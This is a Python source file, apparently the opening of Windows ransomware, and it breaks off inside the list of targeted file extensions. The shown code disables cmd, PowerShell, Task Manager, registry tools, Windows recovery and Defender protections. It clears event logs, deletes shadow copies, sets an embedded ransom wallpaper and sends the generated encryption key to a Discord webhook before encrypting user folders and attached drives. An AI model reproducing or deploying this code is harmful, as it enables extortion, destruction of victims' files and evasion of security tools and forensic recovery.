import os
import sys
import uuid
import zlib
import base64
import string
import winreg
import ctypes
import hashlib
import subprocess
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

import requests
import winshell
from Crypto.Cipher import AES
from file_crypto import encrypt_file
from win32com.client import Dispatch
from discord_webhook import DiscordEmbed, DiscordWebhook

YOUR_WEBHOOK_URL = ""
id = ""


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def freeze_keyboard():
    ctypes.windll.user32.BlockInput(True)


def disable_cmd():
    reg_path = r"Software\Policies\Microsoft\Windows\System"
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as reg:
        winreg.SetValueEx(reg, "DisableCMD", 0, winreg.REG_DWORD, 1)


def disable_powershell():
    ps_path = r"Software\Policies\Microsoft\Windows\PowerShell"
    with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, ps_path) as reg:
        winreg.SetValueEx(reg, "EnableScripts", 0, winreg.REG_DWORD, 0)
        winreg.SetValueEx(reg, "ExecutionPolicy", 0, winreg.REG_SZ, "Disabled")
    console_path = r"Software\Policies\Microsoft\Windows\PowerShell"
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, console_path) as reg:
        winreg.SetValueEx(reg, "DisableWin32Console", 0, winreg.REG_DWORD, 1)
    restrict_path = (
        r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun"
    )
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, restrict_path) as reg:
        winreg.SetValueEx(reg, "1", 0, winreg.REG_SZ, "powershell.exe")
        winreg.SetValueEx(reg, "2", 0, winreg.REG_SZ, "powershell_ise.exe")
    policy_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, policy_path) as reg:
        winreg.SetValueEx(reg, "DisallowRun", 0, winreg.REG_DWORD, 1)


def disable_regedit():
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as reg:
        winreg.SetValueEx(reg, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)


def disable_task_manager():
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as reg:
        winreg.SetValueEx(reg, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)


def disable_recovery():
    execute_command("reagentc /disable")
    execute_command("bcdedit /set {default} recoveryenabled No")


def disable_ram_dump():
    reg_path = r"System\CurrentControlSet\Control\CrashControl"
    with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as reg:
        winreg.SetValueEx(reg, "CrashDumpEnabled", 0, winreg.REG_DWORD, 0)


def clear_event_logs():
    logs = ["Application", "System", "Security", "Setup"]
    for log in logs:
        execute_command(f"wevtutil cl {log}")


def change_wallpaper():
    encoded_image = """
    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
    Sakft2B3ainWDlbZK3wO/R95uEth
    """
    with open(r"C:\windows\web\wallpaper\windows\DCRY.png", "wb") as f:
        f.write(zlib.decompress(base64.b64decode(encoded_image.encode())))
    reg_path = r"Control Panel\Desktop"
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as reg:
        winreg.SetValueEx(
            reg,
            "Wallpaper",
            0,
            winreg.REG_SZ,
            r"C:\windows\web\wallpaper\windows\DCRY.png",
        )


def delete_shadow_copy():
    execute_command("vssadmin delete shadows /all /quiet")


def check_connection(url="http://www.google.com/", timeout=5):
    try:
        response = requests.get(url, timeout=timeout)
        if response.status_code == 200:
            return True
        else:
            return False
    except requests.ConnectionError:
        return False
    except requests.Timeout:
        return False


def block_processes():
    execute_command("powercfg /h off")
    execute_command(
        'powershell -Command "Set-MpPreference -DisableTamperProtection $true"'
    )
    execute_command(
        'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
    )
    execute_command(
        'powershell -Command "Set-MpPreference -EnableControlledFolderAccess Disabled"'
    )
    blocked_processes = [
        "cmd",
        "powershell",
        "regedit",
        "Processhacker",
        "sdclt",
        "SecurityHealthSystray",
    ]
    for proc in blocked_processes:
        execute_command(f"taskkill /f /im {proc}.exe")


def start_encryption():
    global id
    webhook = DiscordWebhook(url=YOUR_WEBHOOK_URL)
    id = uuid.uuid1()
    key = os.urandom(16)
    embed = DiscordEmbed(
        title=f"Username: {os.getlogin()} | ID: {id} | Date: {datetime.now().strftime("%d-%m-%Y")}",
        description=f"Key: {base64.urlsafe_b64encode(b"DCRY+DKEY$" + key).decode()}",
    )
    webhook.add_embed(embed)
    webhook.execute()
    with open(os.path.join(os.environ["USERPROFILE"], "key"), "wb") as f:
        f.write(hashlib.sha256(key).hexdigest().encode())
    encrypt_directory(os.path.join(os.environ["USERPROFILE"], "Desktop"), key)
    encrypt_directory(os.path.join(os.environ["USERPROFILE"], "Downloads"), key)
    encrypt_directory(os.path.join(os.environ["USERPROFILE"], "Documents"), key)
    encrypt_directory(os.path.join(os.environ["USERPROFILE"], "Pictures"), key)
    encrypt_directory(os.path.join(os.environ["USERPROFILE"], "Videos"), key)
    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
    for disk in [
        f"{letter}:/"
        for i, letter in enumerate(string.ascii_uppercase)
        if bitmask & (1 << i)
    ]:
        if disk[:2] != os.getenv("SystemDrive") and disk[:2] != os.getenv("HOMEDRIVE"):
            encrypt_directory(disk, key)


def encrypt_directory(directory_path, key):
    files_targeted = [
        ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots",
        ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc",
        ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo",
        ".cs", ".c", ".cc", ".cxx", ".cpp", ".pas", ".h", ".hpp", ".asm", ".go", ".kt", ".dart", ".scala", ".r", ".m", ".mm", ".hs", ".fs", ".fsi",
        ".rs", ".php", ".js", ".cmd", ".bat", ".ps1", ".vbs", ".vbe", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".pm", ".swift",".py",
        ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".lua",
        ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif",
        ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk",
        ".bz2", ".paq", ".arc", ".aes", ".gpg", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".css",  ".ts", ".pyw",
        ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx",
        ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm",
